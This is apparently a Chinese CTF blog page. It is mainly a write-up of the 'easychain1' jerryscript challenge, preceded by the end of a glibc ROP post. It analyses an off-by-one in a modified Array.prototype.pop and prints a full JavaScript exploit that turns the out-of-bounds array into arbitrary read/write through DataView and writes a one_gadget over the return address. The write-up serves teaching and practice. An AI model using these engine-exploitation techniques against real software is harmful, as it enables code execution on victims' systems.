<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x7f78243fb1fa</span> &lt;svcudp_reply+<span class="number">26</span>&gt;:    mov    rbp,QWORD PTR [rdi+<span class="number">0x48</span>]  </span><br><span class="line"><span class="number">0x7f78243fb1fe</span> &lt;svcudp_reply+<span class="number">30</span>&gt;:    mov    rax,QWORD PTR [rbp+<span class="number">0x18</span>]  </span><br><span class="line"><span class="number">0x7f78243fb202</span> &lt;svcudp_reply+<span class="number">34</span>&gt;:    lea    r13,[rbp+<span class="number">0x10</span>]             </span><br><span class="line"><span class="number">0x7f78243fb206</span> &lt;svcudp_reply+<span class="number">38</span>&gt;:    mov    DWORD PTR [rbp+<span class="number">0x10</span>],<span class="number">0x0</span>   </span><br><span class="line"><span class="number">0x7f78243fb20d</span> &lt;svcudp_reply+<span class="number">45</span>&gt;:    mov    rdi,r13                    </span><br><span class="line"><span class="number">0x7f78243fb210</span> &lt;svcudp_reply+<span class="number">48</span>&gt;:    call   QWORD PTR [rax+<span class="number">0x28</span>]</span><br><span class="line">    <span class="comment">/* [rdi+0x48]中被放入ROP_addr */</span></span><br><span class="line">    <span class="comment">/* [rax+0x28]中被放入&#x27;leave ret&#x27; */</span></span><br></pre></td></tr></table></figure>
<p>由于 <code>_IO_switch_to_wget_mode</code> 可以控制 [RDX]，我们可以考虑用 <code>setcontext+61</code> 来控制栈，我这里就不演示了</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/20/JavaScript%20pwn+Array%20OOB/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/08/20/JavaScript%20pwn+Array%20OOB/" class="post-title-link" itemprop="url">JavaScript pwn+Array OOB</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-08-20 22:42:10 / Modified: 22:44:33" itemprop="dateCreated datePublished" datetime="2022-08-20T22:42:10+08:00">2022-08-20</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Reappearance/" itemprop="url" rel="index"><span itemprop="name">Reappearance</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>11k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>10 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>easychain1 复现</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line"></span><br><span class="line">qemu-system-x86_64  \</span><br><span class="line">-m 512M \</span><br><span class="line">-cpu kvm64,+smep,+smap \</span><br><span class="line">-smp 4 \</span><br><span class="line">-kernel ./vmlinux \</span><br><span class="line">-append &quot;console=ttyS0 nokaslr quiet&quot; \</span><br><span class="line">-initrd rootfs.img \</span><br><span class="line">-monitor /dev/null \</span><br><span class="line">-nographic</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line"></span><br><span class="line">mkdir /tmp</span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t debugfs none /sys/kernel/debug</span><br><span class="line">mount -t devtmpfs devtmpfs /dev</span><br><span class="line">mount -t tmpfs none /tmp</span><br><span class="line">mdev -s</span><br><span class="line">/etc/init.d/rcS</span><br><span class="line">ifconfig lo up</span><br><span class="line"></span><br><span class="line">echo -e &quot;Boot took $(cut -d&#x27; &#x27; -f1 /proc/uptime) seconds&quot;</span><br><span class="line"></span><br><span class="line">poweroff -d 120000 -f &amp;</span><br><span class="line">setsid cttyhack setuidgid pwn /pwn</span><br><span class="line"></span><br><span class="line">poweroff -d 0 -f</span><br></pre></td></tr></table></figure>
<ul>
<li>没有加载驱动程序（和常规的 kernel 不太一样）</li>
<li>进入 kernel 后，程序会以 pwn 用户执行 pwn 文件</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// bad sp value at call has been detected, the output may be wrong!</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> n; <span class="comment">// [rsp+0h] [rbp-8018h]</span></span><br><span class="line">  <span class="keyword">int</span> js; <span class="comment">// [rsp+4h] [rbp-8014h]</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">16</span>]; <span class="comment">// [rsp+8h] [rbp-8010h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v7; <span class="comment">// [rsp+18h] [rbp-8000h] BYREF</span></span><br><span class="line">  __int64 v8[<span class="number">512</span>]; <span class="comment">// [rsp+7018h] [rbp-1000h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> ( v8 != (__int64 *)&amp;v7 )</span><br><span class="line">    ;</span><br><span class="line">  v8[<span class="number">511</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;pwn&gt; &quot;</span>);</span><br><span class="line">  n = read(<span class="number">0</span>, buf, <span class="number">0x1000</span>uLL);</span><br><span class="line">  js = open(<span class="string">&quot;./pwn.js&quot;</span>, <span class="number">65</span>);</span><br><span class="line">  write(js, buf, n);</span><br><span class="line">  system(<span class="string">&quot;./jerry ./pwn.js&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>往 pwn.js 输入 JavaScript 脚本，然后用 jerry 解释该脚本</li>
</ul>
<p>jerryscript 是 JavaScript 轻量级引擎：（专门处理 JavaScript 脚本的虚拟机）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">__assert_fail(</span><br><span class="line"><span class="string">&quot;source_file_p-&gt;type == SOURCE_SCRIPT&quot;</span>,</span><br><span class="line"><span class="string">&quot;/home/david/github/jerryscript/jerry-main/main-desktop.c&quot;</span>,</span><br><span class="line"><span class="number">0x94</span>u,</span><br><span class="line"><span class="string">&quot;main&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Version: %d.%d.%d%s\n&quot;</span>, <span class="number">3LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="string">&quot; (0d496966)&quot;</span>);</span><br></pre></td></tr></table></figure>
<ul>
<li>Version: 3.0.0 (0d496966)</li>
</ul>
<p>源代码地址如下：（Google 搜索 0d496966）</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://gitee.com/mirrors/jerryscript/tree/0d4969661810b9e618485c284c361e597144e9b9">Gitee 极速下载/jerryscript - Gitee.com</a> </li>
</ul>
<p>jerryscript 3.0.0 cve 参考：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.security-database.com/cpe.php?detail=cpe%3A2.3%3Aa%3Ajerryscript%3Ajerryscript%3A3.0.0%3A*%3A*%3A*%3A*%3A*%3A*%3A*">Jerryscript Jerryscript 3.0.0 - Security Database (security-database.com)</a> </li>
</ul>
<p><strong>漏洞分析</strong></p>
<p>可能是魔改源码，可能是 cve，所以我们先 bindiff 一下</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://gitee.com/mirrors/jerryscript.git</span><br><span class="line">cd jerryscript</span><br><span class="line">git reset --hard 0d496966</span><br><span class="line">python tools/build.py --build-type=RelWithDebug --strip=off # 带有符号表</span><br></pre></td></tr></table></figure>
<ul>
<li>不过，如果安装成 DEBUG 版本，在调试的时候会遇到和 V8 一样的 <code>DCHECK</code>，导致我们无法正常调试漏洞</li>
<li>这里，我们可以修改一下源码（<code>jerryscript/jerry-core/jrt/jrt.h</code>）： </li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> JERRY_ASSERT(x)                                     \</span></span><br><span class="line"><span class="meta">  do                                                        \</span></span><br><span class="line"><span class="meta">  &#123;                                                         \</span></span><br><span class="line"><span class="meta">    <span class="meta-keyword">if</span> (JERRY_UNLIKELY (!(x)))                              \</span></span><br><span class="line"><span class="meta">    &#123;                                                       \</span></span><br><span class="line"><span class="meta">      jerry_assert_fail (#x, __FILE__, __func__, __LINE__); \</span></span><br><span class="line"><span class="meta">    &#125;                                                       \</span></span><br><span class="line"><span class="meta">  &#125; while (0)</span></span><br><span class="line">	<span class="comment">/* &lt;---------------- @ ----------------&gt; */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> JERRY_ASSERT(x)                                     \</span></span><br><span class="line"><span class="meta">  do                                                        \</span></span><br><span class="line"><span class="meta">  &#123;                                                         \</span></span><br><span class="line"><span class="meta">    <span class="meta-keyword">if</span> (false)                                              \</span></span><br><span class="line"><span class="meta">    &#123;                                                       \</span></span><br><span class="line"><span class="meta">      JERRY_UNUSED (x);                                     \</span></span><br><span class="line"><span class="meta">    &#125;                                                       \</span></span><br><span class="line"><span class="meta">  &#125; while (0)</span></span><br></pre></td></tr></table></figure>
<ul>
<li>将 DEBUG 版本下的 <code>JERRY_ASSERT</code> 替换成 RELEASE 版本的 <code>JERRY_ASSERT</code> 即可 </li>
</ul>
<p>这个东西折腾了我好久，先是题目解包错误，导致文件 jerry 少了 400KB，后是 bindiff 分析错误，我换了好几个版本的 bindiff 和 IDA，最后发现是中文路径的问题，干</p>
<p>bindiff 分析如下：</p>
<p><img src="/2022/08/20/JavaScript%20pwn+Array%20OOB/1660095791443.png" alt="1660095791443">  </p>
<ul>
<li>说实话这个有点难找，大概 20~30 个函数的相似度都比较接近（可能是编译的问题）</li>
<li>漏洞点在 <code>ecma_builtin_array_prototype_object_pop</code>：（我在网上的 wp 上看的，要是硬要找还真的够呛）</li>
</ul>
<p><img src="/2022/08/20/JavaScript%20pwn+Array%20OOB/1660097546972.png" alt="1660097546972"> </p>
<ul>
<li>在 IDA 中找到对应的位置：</li>
</ul>
<p><img src="/2022/08/20/JavaScript%20pwn+Array%20OOB/1660097809707.png" alt="1660097809707"> </p>
<ul>
<li>调用 <code>ecma_delete_fast_array_properties</code> 的参数被修改了（<code>a2-1 -&gt; a2-2</code>）</li>
</ul>
<p>由于原文件没有符号，所以直接用 bindiff 对照断点位置：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a5ae2: jerryx_print_value <span class="comment">/* 在print执行时触发 */</span></span><br><span class="line"><span class="number">710</span>ab: ecma_builtin_array_prototype_object_pop <span class="comment">/* 断点触发时,用&#x27;p/x $rdi+0x10&#x27;来获取oob数组的地址 */</span></span><br></pre></td></tr></table></figure>
<p>在开始入侵之前要先了解一些 JavaScript 的知识</p>
<p><strong>Array</strong></p>
<p>Array 的结构体如下：（只挑出了 Array 会使用到的内容）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">ecma_object_descriptor_t</span> type_flags_refs;</span><br><span class="line">  <span class="keyword">jmem_cpointer_t</span> gc_next_cp;</span><br><span class="line">  <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="keyword">jmem_cpointer_t</span> property_list_cp; <span class="comment">/* 数组的存储区域 */</span></span><br><span class="line">    ...</span><br><span class="line">  &#125; u1;</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="keyword">jmem_cpointer_t</span> prototype_cp; <span class="comment">/* 数组的原型所在位置 */</span></span><br><span class="line">    ...</span><br><span class="line">  &#125; u2;</span><br><span class="line">&#125; <span class="keyword">ecma_object_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">ecma_object_t</span> object; </span><br><span class="line">  ...</span><br><span class="line">  <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      <span class="keyword">uint32_t</span> length; <span class="comment">/* 数组的长度 */</span></span><br><span class="line">      <span class="keyword">uint32_t</span> length_prop_and_hole_count; </span><br><span class="line">    &#125; <span class="built_in">array</span>;</span><br><span class="line">  &#125; u;</span><br><span class="line">&#125; <span class="keyword">ecma_extended_object_t</span>;</span><br></pre></td></tr></table></figure>
<p>有几个属性值解释一下：</p>
<ul>
<li><code>array-&gt;object.u1.property_list_cp</code>：数组的存储区域</li>
<li><code>array-&gt;object.u2.prototype_cp</code>：数组的原型所在位置</li>
<li><code>array-&gt;u.array.length</code>：数组的长度</li>
</ul>
<p>我们来看一个具体的实例：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>]</span><br></pre></td></tr></table></figure>
<p>在 GDB 中查看：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xg <span class="number">0x555555624f30</span></span><br><span class="line"><span class="number">0x555555624f30</span>:	<span class="number">0x0056005c00560014</span>	<span class="number">0x000000ec00000008</span></span><br><span class="line"><span class="number">0x555555624f40</span>:	<span class="number">0x0000002000000010</span>	<span class="number">0x0000004000000030</span></span><br><span class="line"><span class="number">0x555555624f50</span>:	<span class="number">0x0000006000000050</span>	<span class="number">0x0000008000000070</span></span><br></pre></td></tr></table></figure>
<ul>
<li><code>property_list_cp</code> 和 <code>prototype_cp</code>  的值分为 <code>0x5c</code> 和 <code>0x56</code>，它们在取值的时候，会调用一个函数 <code>jmem_decompress_pointer</code> 进行转换 </li>
<li>而 array 的寻址方式就是 <code>jerry_globals_heap + array-&gt;u1.property_list_cp &lt;&lt; 3</code>（其他的条目同理），通过这种方法，就能够减小内存开销（其实就有点像 shadow memory）</li>
</ul>
<p><strong>ArrayBuffer 和 DataView</strong></p>
<p>ArrayBuffer 对象用来表示通用的、固定长度的原始二进制数据缓冲区</p>
<p>ArrayBuffer 不能直接操作，而是要通过类型数组对象或 DataView 对象来操作，它们会将缓冲区中的数据表示为特定的格式，并通过这些格式来读写缓冲区的内容</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">ecma_extended_object_t</span> extended_object; <span class="comment">/* 扩展对象部分 */</span></span><br><span class="line">  <span class="keyword">void</span> *buffer_p; <span class="comment">/* 指向数组缓冲区对象的后备存储的指针 */</span></span><br><span class="line">  <span class="keyword">void</span> *arraybuffer_user_p; <span class="comment">/* 传递给免费回调的用户指针 */</span></span><br><span class="line">&#125; <span class="keyword">ecma_arraybuffer_pointer_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">ecma_extended_object_t</span> header; <span class="comment">/* 头部分 */</span></span><br><span class="line">  <span class="keyword">ecma_object_t</span> *buffer_p; <span class="comment">/* [ViewedArrayBuffer]内部槽 */</span></span><br><span class="line">  <span class="keyword">uint32_t</span> byte_offset; <span class="comment">/* [ByteOffset]内部槽 */</span></span><br><span class="line">&#125; <span class="keyword">ecma_dataview_object_t</span>;</span><br></pre></td></tr></table></figure>
<p>ArrayBuffer 和 DataView 这两个对象在 JavaScript 引擎漏洞挖掘中经常出现</p>
<p>这里，我们注意到：</p>
<ul>
<li>ArrayBuffer 的结构体存在 <code>buffer_p</code> 这样的一个指针，它直接指向了 ArrayBuffer 所控制的内存区域（而不是像其他对象那样，通过偏移计算来得到所控制的内存区域）</li>
<li>DataView 的结构体中，<code>buffer_p</code> 则是指向 <code>ArrayBuffer-&gt;buffer_p</code></li>
</ul>
<p><strong>Array Out-Of-Boundary（数组越界）</strong></p>
<p>数组索引的边界检查是防止数组访问越界的有效手段，但是对数组索引的边界检查是比较耗时的，因此 JIT 引擎为了提高 Javascript 代码运行效率，对数组的边界检查在一定条件下进行了优化 </p>
<p>Bound Check Optimize（边界检查优化）主要分为 Bound Check Elimination（绑定检查消除）和 Bound Check Hoist（绑定检查提升）两部分，错误的 Elimination 或者 Hoist 都会引发 Array Out-Of-Boundary (OOB) 漏洞 </p>
<p>我们现在回到程序的漏洞点：</p>
<ul>
<li><code>ecma_delete_fast_array_properties</code> 的第二个参数改为 <code>len - 2</code></li>
<li>如果 <code>len</code> 的值为 “1”，就会被减为 “-1”，发生符号溢出</li>
</ul>
<p>案例如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">1</span>]; <span class="comment">/* len=1 */</span></span><br><span class="line">a.pop(); <span class="comment">/* 触发ecma_delete_fast_array_properties,导致len=-1 */</span></span><br><span class="line">print(a.length);</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  pwn ./jerry ./pwn2.js </span><br><span class="line"><span class="number">4294967295</span> <span class="comment">/* 0xffffffff -&gt; len=-1 */</span></span><br><span class="line">[<span class="number">1</span>]    <span class="number">9011</span> segmentation fault  ./jerry ./pwn2.js</span><br></pre></td></tr></table></figure>
<ul>
<li>触发 Array OOB </li>
</ul>
<p>参考：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/187739">Chakra漏洞调试笔记4——Array OOB</a> </p>
<p><strong>入侵思路</strong></p>
<p>完整的 exp 如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex</span>(<span class="params">i</span>)</span>&#123;<span class="keyword">return</span> <span class="string">&quot;0x&quot;</span> + i.toString(<span class="number">16</span>).padStart(<span class="number">16</span>, <span class="string">&#x27;0&#x27;</span>);&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aar</span>(<span class="params">addr, dv1, dv2</span>)</span>&#123;</span><br><span class="line">    dv1.setBigUint64(<span class="number">0</span>, addr, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">if</span>(dv2.buffer)&#123;</span><br><span class="line">        <span class="keyword">return</span> dv2.getBigUint64(<span class="number">0</span>, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aaw</span>(<span class="params">addr, value, dv1, dv2</span>)</span>&#123;</span><br><span class="line">    dv1.setBigUint64(<span class="number">0</span>, addr, <span class="literal">true</span>);</span><br><span class="line">    dv2.setBigUint64(<span class="number">0</span>, value, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> a = [<span class="number">0x31</span>];</span><br><span class="line">a1 = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x1000</span>);</span><br><span class="line">d1 = <span class="keyword">new</span> <span class="built_in">DataView</span>(a1);</span><br><span class="line">d1.setUint32(<span class="number">0</span>, <span class="number">0x41414141</span>, <span class="literal">true</span>);</span><br><span class="line">a2 = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x1000</span>);</span><br><span class="line">d2 = <span class="keyword">new</span> <span class="built_in">DataView</span>(a2);</span><br><span class="line">d2.setUint32(<span class="number">0</span>, <span class="number">0x42424242</span>, <span class="literal">true</span>);</span><br><span class="line">a.pop();</span><br><span class="line">a[<span class="number">0x2c</span>] = <span class="number">0x5562526</span>;</span><br><span class="line">puts_got            = <span class="built_in">Number</span>(aar(<span class="number">0x555555621e08</span>, d1, d2));</span><br><span class="line">libc_base           = puts_got - <span class="number">0x84420</span>;</span><br><span class="line">environ             = libc_base + <span class="number">0x1ef600</span>;</span><br><span class="line">stack               = <span class="built_in">Number</span>(aar(environ, d1, d2));</span><br><span class="line">libc_start_main_ret = stack - <span class="number">0x108</span>;</span><br><span class="line">libc_start_main     = <span class="built_in">Number</span>(aar(libc_start_main_ret, d1, d2));</span><br><span class="line">aaw(libc_start_main_ret, <span class="number">0x555555554000</span> + <span class="number">0xa9a9</span>, d1, d2);  <span class="comment">// pop r12, rbp</span></span><br><span class="line">aaw(libc_start_main_ret + <span class="number">8</span>, <span class="number">0</span>, d1, d2);</span><br><span class="line">aaw(libc_start_main_ret + <span class="number">16</span>, <span class="number">0</span>, d1, d2);</span><br><span class="line">aaw(libc_start_main_ret + <span class="number">24</span>, libc_base + <span class="number">0xe3afe</span>, d1, d2);  <span class="comment">// one_gadget</span></span><br><span class="line">print(hex(puts_got));</span><br><span class="line">print(hex(libc_base));</span><br><span class="line">print(hex(stack));</span><br><span class="line">print(hex(libc_start_main));</span><br><span class="line">print(hex(<span class="built_in">Number</span>(aar(<span class="number">0x555555624000</span>, d1, d2))));</span><br></pre></td></tr></table></figure>
<ul>
<li>因为这些函数和变量都会改变堆布局，所以我直接调试 exp</li>
</ul>
<p>在 <code>ecma_builtin_array_prototype_object_pop</code>（710ab）打断点，然后使用 <code>p/x $rdi+0x10</code> 命令就可以把发生 OOB 的数组 <code>a</code> 给打印出来：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p/x $rdi+<span class="number">0x10</span></span><br><span class="line">$<span class="number">1</span> = <span class="number">0x555555624f80</span></span><br><span class="line">pwndbg&gt; x/<span class="number">20</span>xg <span class="number">0x555555624f80</span><span class="number">-0x10</span></span><br><span class="line"><span class="number">0x555555624f70</span>:	<span class="number">0x005e0064005e0014</span>	<span class="number">0x000000ecffffffff</span> <span class="comment">/* length */</span></span><br><span class="line"><span class="number">0x555555624f80</span>:	<span class="number">0x0025000000c80038</span>	<span class="number">0x0000000100200004</span></span><br><span class="line"><span class="number">0x555555624f90</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x42d5555558878200</span></span><br><span class="line"><span class="number">0x555555624fa0</span>:	<span class="number">0x0025006e00620018</span>	<span class="number">0x0000000100000012</span></span><br><span class="line"><span class="number">0x555555624fb0</span>:	<span class="number">0x000003c300587d37</span>	<span class="number">0x012f007200000343</span></span><br></pre></td></tr></table></figure>
<ul>
<li><code>property_list_cp</code> 和 <code>prototype_cp</code> 的值分为 <code>0x64</code> 和 <code>0x5e</code> </li>
</ul>
<p>然后在 <code>jerryx_print_value</code>（a5ae2）打断点，执行到 <code>print(a.length)</code> 前停下，打印两个 DataView 对象的位置：</p>
